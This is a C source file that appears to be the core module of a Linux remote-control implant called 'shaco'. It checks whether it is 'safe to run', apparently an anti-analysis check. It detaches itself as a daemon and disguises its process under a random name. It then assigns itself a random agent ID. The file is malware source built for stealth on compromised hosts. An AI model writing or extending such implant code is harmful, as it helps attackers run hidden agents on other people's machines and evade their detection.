#include "Core.h"
#include "Commands.h"

#include "../Config/Settings.h"
#include "../Helpers/Protect.h"

#include <sys/prctl.h>
#include <sys/stat.h>
#include <signal.h>
#include <unistd.h>
#include <time.h>


/*clock_t s_clock(void) {
    static clock_t start_time = 0;
    struct timespec current_time;

    if (clock_gettime(CLOCK_MONOTONIC, &current_time) == -1) 
        return (clock_t)-1;
    
    if (start_time == 0) {
        start_time = current_time.tv_sec * CLOCKS_PER_SEC + current_time.tv_nsec / (1000000000 / CLOCKS_PER_SEC);
        return 0;
    }
    return (current_time.tv_sec * CLOCKS_PER_SEC + current_time.tv_nsec / (1000000000 / CLOCKS_PER_SEC)) - start_time;
}*/

void daemonize(){
#ifdef DAEMONIZE
    pid_t _t = fork();
    if(_t < 0 || _t > 0) shaco_exit();
    setsid();
    signal(SIGCHLD, SIG_IGN);
    signal(SIGHUP, SIG_IGN);
    _t = fork();
    if (_t < 0 || _t > 0) shaco_exit();
    umask(0);
    chdir("/");
#endif
}


bool shaco_init(char **argv){
    MSG("Checking if is safe to run");
    if(!is_safe_to_run()) { MSG("Is not safe to run"); return false;}

    daemonize();

    char *procname = generate_random_str(generate_random_int(3,7));
    prctl(PR_SET_NAME, procname,0,0,0);

    PSETTINGS ps = get_settings();
#ifndef DEBUG
    ps->agent_id = generate_random_int(1111, 999999);
#else
    ps->agent_id = 0;
#endif

    return true;
}

void shaco_exit(){ _exit(1); }

void shaco_sleep(int value){
    if(value <= 0) return;
    sleep(value);
//    clock_t init = s_clock();
//    while(s_clock() - init < (value * 1000) * CLOCKS_PER_SEC / 1000);
}
